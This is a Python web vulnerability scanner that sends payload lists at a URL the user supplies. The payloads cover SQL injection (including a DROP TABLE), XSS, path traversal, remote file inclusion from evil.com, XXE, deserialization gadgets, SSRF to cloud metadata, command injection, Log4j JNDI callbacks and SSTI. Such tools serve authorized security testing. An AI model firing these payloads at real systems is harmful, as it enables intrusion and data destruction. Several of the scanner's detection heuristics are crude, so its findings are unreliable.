#!/usr/bin/env python3

# Advanced Web Vulnerability Scanner - Python Version
# Alternative implementation for systems without Lua

import sys
import json
import requests
import urllib3
import argparse
import time
import re
from urllib.parse import urljoin, urlparse
from datetime import datetime

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class VulnerabilityScanner:
    def __init__(self, target_url, timeout=10, user_agent=None):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.user_agent = user_agent or "AdvancedVulnScanner/1.0"
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': self.user_agent,
            'Accept': '*/*',
            'Connection': 'keep-alive'
        })
        self.vulnerabilities = []
        self.scan_start_time = datetime.now()
        
    def add_vulnerability(self, name, severity, description, proof_of_concept, exploitation_method):
        vuln = {
            'name': name,
            'severity': severity,
            'description': description,
            'proof_of_concept': proof_of_concept,
            'exploitation_method': exploitation_method,
            'timestamp': datetime.now().isoformat()
        }
        self.vulnerabilities.append(vuln)
        print(f"[{severity.upper()}] {name}: {description}")
        
    def test_sql_injection(self):
        print("[*] Testing for SQL Injection vulnerabilities...")
        
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT null--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "' OR SLEEP(5)--",
            "' OR pg_sleep(5)--",
            "' OR WAITFOR DELAY '0:0:5'--"
        ]
        
        test_params = ['id', 'user', 'name', 'email', 'search', 'q', 'page']
        
        for param in test_params:
            for payload in sql_payloads:
                try:
                    # Test in URL parameter
                    url = f"{self.target_url}/test?{param}={payload}"
                    response = self.session.get(url, timeout=self.timeout)
                    
                    if any(error in response.text.lower() for error in [
                        'mysql_fetch_array', 'ora-', 'postgresql', 'microsoft ole db',
                        'sqlserver', 'syntax error', 'warning: mysql'
                    ]):
                        self.add_vulnerability(
                            "SQL Injection",
                            "critical",
                            f"SQL injection vulnerability found in parameter '{param}'",
                            f"Payload: {payload}",
                            "Use SQLMap or manual exploitation to extract data"
                        )
                        return
                        
                except requests.exceptions.RequestException:
                    continue
                    
    def test_xss(self):
        print("[*] Testing for Cross-Site Scripting (XSS) vulnerabilities...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>"
        ]
        
        test_params = ['search', 'q', 'name', 'input', 'text', 'message', 'comment']
        
        for param in test_params:
            for payload in xss_payloads:
                try:
                    url = f"{self.target_url}/test?{param}={payload}"
                    response = self.session.get(url, timeout=self.timeout)
                    
                    if payload in response.text:
                        self.add_vulnerability(
                            "Cross-Site Scripting (XSS)",
                            "high",
                            f"Reflected XSS vulnerability found in parameter '{param}'",
                            f"Payload: {payload}",
                            "Craft malicious URLs to steal cookies or perform actions"
                        )
                        return
                        
                except requests.exceptions.RequestException:
                    continue
                    
    def test_directory_traversal(self):
        print("[*] Testing for Directory Traversal vulnerabilities...")
        
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/etc/passwd",
            "C:\\windows\\system32\\drivers\\etc\\hosts"
        ]
        
        test_files = ['image', 'file', 'document', 'page', 'template']
        
        for test_file in test_files:
            for payload in traversal_payloads:
                try:
                    url = f"{self.target_url}/{test_file}?path={payload}"
                    response = self.session.get(url, timeout=self.timeout)
                    
                    if any(indicator in response.text for indicator in [
                        'root:x:', 'daemon:', 'Administrator', 'Windows'
                    ]):
                        self.add_vulnerability(
                            "Directory Traversal",
                            "critical",
                            f"Path traversal vulnerability in file parameter '{test_file}'",
                            f"Payload: {payload}",
                            "Access sensitive system files and configuration"
                        )
                        return
                        
                except requests.exceptions.RequestException:
                    continue
                    
    def test_file_inclusion(self):
        print("[*] Testing for File Inclusion vulnerabilities...")
        
        inclusion_payloads = [
            "php://filter/convert.base64-encode/resource=index.php",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
            "expect://id",
            "http://evil.com/shell.txt",
            "ftp://evil.com/shell.txt"
        ]
        
        test_params = ['file', 'page', 'include', 'template', 'path']
        
        for param in test_params:
            for payload in inclusion_payloads:
                try:
                    url = f"{self.target_url}/include?{param}={payload}"
                    response = self.session.get(url, timeout=self.timeout)
                    
                    if any(indicator in response.text for indicator in [
                        'PD9waH', 'base64', 'uid=', 'gid=', 'www-data'
                    ]):
                        self.add_vulnerability(
                            "File Inclusion (LFI/RFI)",
                            "critical",
                            f"File inclusion vulnerability in parameter '{param}'",
                            f"Payload: {payload}",
                            "Execute arbitrary code or include remote files"
                        )
                        return
                        
                except requests.exceptions.RequestException:
                    continue
                    
    def test_advanced_xxe_vulnerabilities(self):
        """Test for advanced XXE vulnerabilities including blind XXE"""
        print("[*] Testing for advanced XXE vulnerabilities...")
        
        # Advanced XXE payloads for different scenarios
        xxe_payloads = [
            # Basic XXE
            '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>''',
            
            # Blind XXE with external DTD
            '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
<root></root>''',
            
            # XXE with parameter entities
            '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://scanner.example.com/xxe.dtd">
%xxe;
]>
<root>&send;</root>''',
            
            # XXE for Windows systems
            '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>''',
            
            # XXE for network access (SSRF)
            '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://internal.scanner.example.com/admin">
]>
<root>&xxe;</root>'''
        ]
        
        headers = {'Content-Type': 'application/xml'}
        
        for payload in xxe_payloads:
            try:
                # Test POST request
                response = self.session.post(
                    f"{self.target_url}/api/xml",
                    data=payload,
                    headers=headers,
                    timeout=self.timeout
                )
                
                # Check for XXE indicators
                if any(indicator in response.text for indicator in [
                    'root:x:', 'daemon:', 'bitnami', 'www-data',
                    'for 16-bit app support', '[fonts]', '[extensions]'
                ]):
                    self.add_vulnerability(
                        "XML External Entity (XXE) Injection",
                        "high",
                        "XXE vulnerability allows file system access",
                        "External entity injection detected",
                        "Read local files, access internal networks, perform SSRF"
                    )
                    return
                    
                # Check for blind XXE indicators
                if response.status_code == 500 or 'entity' in response.text.lower():
                    self.add_vulnerability(
                        "Blind XXE Injection",
                        "high", 
                        "Potential blind XXE vulnerability detected",
                        "Server processed XML with external entities",
                        "Use out-of-band techniques to confirm and exploit"
                    )
                    return
                    
            except requests.exceptions.RequestException:
                continue
                
    def test_deserialization_vulnerabilities(self):
        """Test for insecure deserialization vulnerabilities"""
        print("[*] Testing for deserialization vulnerabilities...")
        
        # PHP deserialization payloads
        php_payloads = [
            'O:8:"stdClass":1:{s:4:"test";s:10:"phpinfo();";}',
            'a:2:{i:0;s:4:"test";i:1;O:8:"stdClass":1:{s:4:"exec";s:2:"id";}}',
            'O:1:"A":1:{s:4:"test";R:2;}',
            'C:11:"ArrayObject":2:{x:i:0;a:0:{};m:a:0:{}}'
        ]
        
        # Java deserialization payloads (base64 encoded)
        java_payloads = [
            'rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlckGaesxLN2EcbgIAAHhw',
            'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwAAAA'
        ]
        
        # .NET deserialization payloads
        dotnet_payloads = [
            '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"><SOAP-ENV:Body><test>test</test></SOAP-ENV:Body></SOAP-ENV:Envelope>',
            '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList, mscorlib","$values":["cmd.exe","/c calc.exe"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}'
        ]
        
        # Test PHP deserialization
        for payload in php_payloads:
            try:
                headers = {'Content-Type': 'application/x-php-serialized'}
                response = self.session.post(
                    f"{self.target_url}/deserialize",
                    data=payload,
                    headers=headers,
                    timeout=self.timeout
                )
                
                if any(indicator in response.text for indicator in [
                    'phpinfo', 'PHP Version', 'Zend Engine',
                    'uid=', 'gid=', 'groups='
                ]):
                    self.add_vulnerability(
                        "PHP Deserialization",
                        "critical",
                        "PHP object injection vulnerability",
                        f"Payload: {payload[:50]}...",
                        "Execute arbitrary PHP code via object injection"
                    )
                    return
                    
            except requests.exceptions.RequestException:
                continue
        
        # Test Java deserialization  
        for payload in java_payloads:
            try:
                headers = {'Content-Type': 'application/x-java-serialized-object'}
                response = self.session.post(
                    f"{self.target_url}/api/object",
                    data=payload,
                    headers=headers,
                    timeout=self.timeout
                )
                
                if response.status_code == 500 and any(error in response.text for error in [
                    'ClassNotFoundException', 'InvalidClassException',
                    'StreamCorruptedException', 'OptionalDataException'
                ]):
                    self.add_vulnerability(
                        "Java Deserialization",
                        "critical",
                        "Java deserialization vulnerability detected",
                        "Serialized Java object processing detected",
                        "Execute arbitrary code via gadget chains"
                    )
                    return
                    
            except requests.exceptions.RequestException:
                continue
                
    def test_graphql_vulnerabilities(self):
        """Test for GraphQL vulnerabilities"""
        print("[*] Testing for GraphQL vulnerabilities...")
        
        # Common GraphQL endpoint paths
        graphql_paths = ['/graphql', '/api/graphql', '/graphiql', '/api/graphiql']
        
        # Introspection query
        introspection_query = {
            "query": "{ __schema { types { name fields { name } } } }"
        }
        
        # SQL injection in GraphQL
        sql_injection_query = {
            "query": "{ user(id: \"1' OR '1'='1\") { name email } }"
        }
        
        # Batch query attack
        batch_query = [
            {"query": "{ user(id: 1) { name } }"},
            {"query": "{ user(id: 2) { name } }"},
            {"query": "{ user(id: 3) { name } }"}
        ]
        
        for path in graphql_paths:
            try:
                # Test introspection
                response = self.session.post(
                    f"{self.target_url}{path}",
                    json=introspection_query,
                    timeout=self.timeout
                )
                
                if response.status_code == 200 and '__schema' in response.text:
                    self.add_vulnerability(
                        "GraphQL Introspection Enabled",
                        "medium",
                        "GraphQL introspection allows schema discovery",
                        f"Accessible at: {path}",
                        "Discover API structure and potential vulnerabilities"
                    )
                    return
                
                # Test SQL injection
                response = self.session.post(
                    f"{self.target_url}{path}",
                    json=sql_injection_query,
                    timeout=self.timeout
                )
                
                if any(error in response.text for error in [
                    'SQL', 'mysql', 'postgresql', 'sqlite',
                    'syntax error', 'ORA-', 'column'
                ]):
                    self.add_vulnerability(
                        "GraphQL SQL Injection",
                        "critical",
                        "SQL injection vulnerability in GraphQL query",
                        "SQL injection in GraphQL parameters",
                        "Extract or manipulate database data"
                    )
                    return
                    
            except requests.exceptions.RequestException:
                continue
                
    def test_server_side_request_forgery(self):
        """Test for Server-Side Request Forgery (SSRF) vulnerabilities"""
        print("[*] Testing for SSRF vulnerabilities...")
        
        # SSRF payloads targeting internal services
        ssrf_payloads = [
            # Internal IP addresses
            'http://127.0.0.1:80',
            'http://localhost:80',
            'http://10.0.0.1:80',
            'http://192.168.1.1:80',
            'http://172.16.0.1:80',
            
            # Cloud metadata endpoints
            'http://169.254.169.254/latest/meta-data/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://instance-data',
            
            # Internal hostnames
            'http://internal',
            'http://admin',
            'http://api-internal',
            
            # Protocol smuggling
            'file:///etc/passwd',
            'dict://127.0.0.1:11211',
            'gopher://127.0.0.1:70',
            'ftp://127.0.0.1:21'
        ]
        
        # Common parameters that might be vulnerable to SSRF
        ssrf_params = ['url', 'link', 'redirect', 'callback', 'webhook', 'target', 'endpoint']
        
        for param in ssrf_params:
            for payload in ssrf_payloads:
                try:
                    # Test in GET parameter
                    url = f"{self.target_url}/fetch?{param}={payload}"
                    response = self.session.get(url, timeout=self.timeout)
                    
                    # Check for successful SSRF indicators
                    if any(indicator in response.text for indicator in [
                        'ami-id', 'instance-id', 'computeMetadata',
                        'root:x:', 'daemon:', 'bin:',
                        'Internal Server Error', 'Connection refused'
                    ]):
                        self.add_vulnerability(
                            "Server-Side Request Forgery (SSRF)",
                            "critical",
                            f"SSRF vulnerability in parameter '{param}'",
                            f"Payload: {payload}",
                            "Access internal services, cloud metadata, and internal network"
                        )
                        return
                        
                    # Check for different response times (blind SSRF)
                    if response.elapsed.total_seconds() > 5:
                        self.add_vulnerability(
                            "Potential Blind SSRF",
                            "high",
                            f"Potential blind SSRF in parameter '{param}'",
                            f"Delayed response for: {payload}",
                            "Use out-of-band techniques to confirm SSRF"
                        )
                        return
                        
                except requests.exceptions.RequestException:
                    continue
    
    def test_command_injection_vulnerabilities(self):
        """Test for command injection vulnerabilities"""
        print("[*] Testing for command injection vulnerabilities...")
        
        # Command injection payloads
        cmd_payloads = [
            '; id',
            '| id',
            '&& id',
            '`id`',
            '$(id)',
            '\n id',
            '|| id',
            '; system("id")',
            '| system("id")',
            '&& system("id")'
        ]
        
        # Common parameters vulnerable to command injection
        cmd_params = ['cmd', 'command', 'exec', 'execute', 'run', 'shell', 'system', 'ping', 'host']
        
        for param in cmd_params:
            for payload in cmd_payloads:
                try:
                    url = f"{self.target_url}/execute?{param}={payload}"
                    response = self.session.get(url, timeout=self.timeout)
                    
                    # Check for command execution indicators
                    if any(indicator in response.text for indicator in [
                        'uid=', 'gid=', 'groups=',
                        'Windows', 'Microsoft', 'Directory of',
                        'root:x:', 'daemon:', 'bin:',
                        'command not found', 'is not recognized'
                    ]):
                        self.add_vulnerability(
                            "Command Injection",
                            "critical",
                            f"Command injection in parameter '{param}'",
                            f"Payload: {payload}",
                            "Execute arbitrary system commands on the server"
                        )
                        return
                        
                except requests.exceptions.RequestException:
                    continue

    def test_zero_day_vulnerabilities(self):
        """Test for zero-day vulnerabilities including Log4j, Spring4Shell, etc."""
        print("[*] Testing for Zero-Day vulnerabilities...")
        
        # Test for Log4j vulnerability (CVE-2021-44228)
        log4j_payloads = [
            "${jndi:ldap://scanner.example.com/a}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://scanner.example.com/a}",
            "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://scanner.example.com/a}",
            "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//scanner.example.com/a}"
        ]
        
        # Test for Spring4Shell (CVE-2022-22965)
        spring4shell_patterns = [
            "class.module.classLoader.resources.context.parent.pipeline.first.pattern",
            "class.module.classLoader.resources.context.parent.pipeline.first.suffix",
            "class.module.classLoader.resources.context.parent.pipeline.first.directory",
            "class.module.classLoader.resources.context.parent.pipeline.first.prefix"
        ]
        
        # Test headers for Log4j
        headers_to_test = [
            'User-Agent', 'X-Api-Version', 'X-Forwarded-For', 'X-Client-IP',
            'X-Remote-IP', 'X-Remote-Addr', 'X-ProxyUser-Ip', 'CF-Connecting_IP',
            'True-Client-IP', 'X-Original-URL', 'X-Rewrite-URL', 'Referer'
        ]
        
        # Test Log4j in headers
        for header in headers_to_test:
            for payload in log4j_payloads:
                try:
                    test_headers = {header: payload}
                    response = self.session.get(
                        self.target_url,
                        headers=test_headers,
                        timeout=self.timeout
                    )
                    
                    # Check for indicators of successful exploitation
                    if response.status_code == 500 or 'jndi' in response.text.lower():
                        self.add_vulnerability(
                            "Log4j Zero-Day (CVE-2021-44228)",
                            "critical",
                            f"Log4j vulnerability detected via {header} header",
                            f"Payload: {payload}",
                            "Remote code execution possible via JNDI injection"
                        )
                        return
                        
                except requests.exceptions.RequestException:
                    continue
        
        # Test Log4j in parameters
        test_params = ['input', 'search', 'q', 'data', 'message', 'text']
        for param in test_params:
            for payload in log4j_payloads:
                try:
                    url = f"{self.target_url}/test?{param}={payload}"
                    response = self.session.get(url, timeout=self.timeout)
                    
                    if response.status_code == 500 or 'jndi' in response.text.lower():
                        self.add_vulnerability(
                            "Log4j Zero-Day (CVE-2021-44228)",
                            "critical",
                            f"Log4j vulnerability detected via {param} parameter",
                            f"Payload: {payload}",
                            "Remote code execution possible via JNDI injection"
                        )
                        return
                        
                except requests.exceptions.RequestException:
                    continue
        
        # Test for Spring4Shell
        for pattern in spring4shell_patterns:
            try:
                # Test via POST parameters
                data = {pattern: "test_pattern"}
                response = self.session.post(
                    f"{self.target_url}/test",
                    data=data,
                    timeout=self.timeout
                )
                
                if response.status_code == 400 or 'spring' in response.text.lower():
                    self.add_vulnerability(
                        "Spring4Shell Zero-Day (CVE-2022-22965)",
                        "critical",
                        "Spring4Shell vulnerability detected",
                        f"Pattern: {pattern}",
                        "Remote code execution via data binding manipulation"
                    )
                    return
                    
            except requests.exceptions.RequestException:
                continue
    
    def test_advanced_zero_day_payloads(self):
        """Test for advanced zero-day patterns and behaviors"""
        print("[*] Testing for advanced zero-day patterns...")
        
        # Test for Polymorphic XSS patterns
        poly_xss_payloads = [
            "<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<iframe/src=javascript:alert('XSS')>",
            "<body/onload=alert('XSS')>",
            "<input/onfocus=alert('XSS') autofocus>"
        ]
        
        # Test for Advanced SQL Injection
        advanced_sql_payloads = [
            "'; DECLARE @cmd VARCHAR(1000); SET @cmd = 'dir'; EXEC(@cmd)--",
            "' UNION SELECT 1,@@version,3,4,5--",
            "'; DROP TABLE users;--",
            "' OR 1=1 LIMIT 1--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--"
        ]
        
        # Test for Server-Side Template Injection (SSTI)
        ssti_payloads = [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "{{config.__class__.__init__.__globals__}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}"
        ]
        
        # Test SSTI
        for payload in ssti_payloads:
            try:
                # Test in parameters
                test_params = ['template', 'name', 'message', 'content']
                for param in test_params:
                    url = f"{self.target_url}/test?{param}={payload}"
                    response = self.session.get(url, timeout=self.timeout)
                    
                    if '49' in response.text or 'java.lang' in response.text.lower():
                        self.add_vulnerability(
                            "Server-Side Template Injection (SSTI)",
                            "critical",
                            "SSTI vulnerability allows code execution",
                            f"Payload: {payload}",
                            "Execute arbitrary code on server via template injection"
                        )
                        return
                        
            except requests.exceptions.RequestException:
                continue
    
    def test_memory_corruption_vulnerabilities(self):
        """Test for memory corruption patterns"""
        print("[*] Testing for memory corruption patterns...")
        
        # Buffer overflow patterns
        overflow_patterns = [
            "A" * 1000,
            "\\x41" * 5000,
            "%s" * 1000,
            "%n" * 500,
            "\"%s\"%s\"%s\"%s" * 200
        ]
        
        for pattern in overflow_patterns:
            try:
                # Test in headers
                headers = {'User-Agent': pattern, 'X-Test': pattern}
                response = self.session.get(
                    self.target_url,
                    headers=headers,
                    timeout=self.timeout
                )
                
                if response.status_code == 500 or 'segmentation' in response.text.lower():
                    self.add_vulnerability(
                        "Potential Buffer Overflow",
                        "critical",
                        "Buffer overflow pattern caused server error",
                        f"Pattern length: {len(pattern)}",
                        "May lead to arbitrary code execution or DoS"
                    )
                    return
                    
            except requests.exceptions.RequestException:
                continue

    def run_scan(self):
        print(f"\n[*] Starting vulnerability scan for: {self.target_url}")
        print(f"[*] Scan started at: {self.scan_start_time.strftime('%Y-%m-%d %H:%M:%S')}")
        
        # Run all vulnerability tests
        self.test_sql_injection()
        self.test_xss()
        self.test_directory_traversal()
        self.test_file_inclusion()
        self.test_advanced_xxe_vulnerabilities()
        self.test_deserialization_vulnerabilities()
        self.test_graphql_vulnerabilities()
        self.test_server_side_request_forgery()
        self.test_command_injection_vulnerabilities()
        
        # Run advanced zero-day vulnerability tests
        self.test_zero_day_vulnerabilities()
        self.test_advanced_zero_day_payloads()
        self.test_memory_corruption_vulnerabilities()
        
        scan_duration = datetime.now() - self.scan_start_time
        print(f"\n[*] Scan completed in: {scan_duration.total_seconds():.2f} seconds")
        
        return len(self.vulnerabilities) > 0
        
    def generate_summary(self):
        summary = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
        for vuln in self.vulnerabilities:
            summary[vuln['severity']] = summary.get(vuln['severity'], 0) + 1
        return summary
        
    def generate_report(self):
        return {
            'scan_metadata': {
                'scanner_name': 'Advanced Web Vulnerability Scanner (Python)',
                'version': '1.0.0',
                'scan_date': datetime.now().isoformat(),
                'target_url': self.target_url,
                'scan_duration': str(datetime.now() - self.scan_start_time)
            },
            'vulnerability_summary': self.generate_summary(),
            'discovered_vulnerabilities': self.vulnerabilities,
            'total_vulnerabilities': len(self.vulnerabilities)
        }

def print_banner():
    print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    Advanced Web Vulnerability Scanner                       ║
║                            Python Version 1.0.0                             ║
║                                                                              ║
║  ⚠️  WARNING: This tool is for authorized security testing only!           ║
║     Unauthorized use may violate applicable laws.                           ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """)

def main():
    print_banner()
    
    parser = argparse.ArgumentParser(description='Advanced Web Vulnerability Scanner')
    parser.add_argument('target_url', help='Target URL to scan')
    parser.add_argument('-o', '--output', help='Output JSON report file')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout (default: 10)')
    parser.add_argument('--user-agent', default='VulnScanner/1.0', help='Custom User-Agent')
    
    args = parser.parse_args()
    
    # Validate URL
    if not args.target_url.startswith(('http://', 'https://')):
        print("[!] Error: URL must start with http:// or https://")
        sys.exit(1)
        
    print(f"[*] Target: {args.target_url}")
    print(f"[*] User-Agent: {args.user_agent}")
    print(f"[*] Timeout: {args.timeout} seconds")
    print()
    
    # Create scanner instance
    scanner = VulnerabilityScanner(
        args.target_url,
        timeout=args.timeout,
        user_agent=args.user_agent
    )
    
    # Run scan
    vulnerabilities_found = scanner.run_scan()
    
    # Generate report
    report = scanner.generate_report()
    
    # Display summary
    print("\n" + "="*80)
    print("                           SCAN SUMMARY")
    print("="*80)
    
    summary = scanner.generate_summary()
    print(f"Total Vulnerabilities Found: {len(scanner.vulnerabilities)}")
    print(f"Critical: {summary.get('critical', 0)}")
    print(f"High: {summary.get('high', 0)}")
    print(f"Medium: {summary.get('medium', 0)}")
    print(f"Low: {summary.get('low', 0)}")
    print(f"Info: {summary.get('info', 0)}")
    
    # Determine risk level
    risk_level = "LOW"
    if summary.get('critical', 0) > 0:
        risk_level = "CRITICAL"
    elif summary.get('high', 0) > 0:
        risk_level = "HIGH"
    elif summary.get('medium', 0) > 0:
        risk_level = "MEDIUM"
        
    print(f"\nOverall Risk Level: {risk_level}")
    
    # Save report if requested
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(report, f, indent=2)
        print(f"\n[+] Report saved to: {args.output}")
    
    # Print recommendations
    print("\n" + "="*80)
    print("[!] SECURITY RECOMMENDATIONS:")
    print("="*80)
    
    if summary.get('critical', 0) > 0:
        print("\nCRITICAL (Immediate Action Required):")
        print("  ⚠️  Review all critical vulnerabilities immediately")
        print("  ⚠️  Implement proper input validation and sanitization")
        print("  ⚠️  Update all software components")
        
    if summary.get('high', 0) > 0:
        print("\nHIGH PRIORITY:")
        print("  🔴 Implement output encoding for XSS prevention")
        print("  🔴 Use parameterized queries for database operations")
        print("  🔴 Implement proper access controls")
        
    if summary.get('medium', 0) > 0:
        print("\nMEDIUM PRIORITY:")
        print("  🟡 Add security headers")
        print("  🟡 Implement rate limiting")
        print("  🟡 Use HTTPS everywhere")
        
    print("\nGENERAL RECOMMENDATIONS:")
    print("  🟢 Conduct regular security assessments")
    print("  🟢 Keep software up to date")
    print("  🟢 Implement comprehensive logging")
    print("  🟢 Train development team on secure coding")
    
    print("\n" + "="*80)
    print("⚠️  DISCLAIMER: This scan was performed for security testing purposes.")
    print("   Ensure you have proper authorization before testing any system.")
    print("="*80)

if __name__ == "__main__":
    main()